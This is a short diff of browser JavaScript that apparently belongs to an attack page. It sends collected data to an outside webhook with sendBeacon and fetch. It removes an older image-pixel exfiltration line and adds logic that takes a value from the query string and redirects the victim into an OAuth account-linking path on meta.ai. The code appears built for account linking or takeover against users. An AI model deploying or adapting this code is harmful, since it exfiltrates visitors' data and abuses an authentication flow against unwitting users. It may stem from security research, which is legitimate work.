@@ -16,9 +16,6 @@
     ts: new Date().toISOString()
   };
 
-  var img = new Image();
-  img.src = webhook + "?d=" + encodeURIComponent(JSON.stringify(data));
-
   if (navigator.sendBeacon) {
     navigator.sendBeacon(webhook, JSON.stringify(data));
   }
@@ -29,9 +26,15 @@
     headers: {"Content-Type": "text/plain"},
     body: JSON.stringify(data)
   }).finally(function(){
-    setTimeout(function(){
-      window.location.href = "https://meta.ai/";
-    }, 500);
+    var raw = window.location.search.substring(1);
+    try {
+      var decoded = decodeURIComponent(raw);
+      if (decoded.indexOf("/oauth_account_linking/") === 0) {
+        window.location.href = "https://www.meta.ai" + decoded;
+        return;
+      }
+    } catch(e) {}
+    window.location.href = "https://meta.ai/";
   });
 })();
 </script>
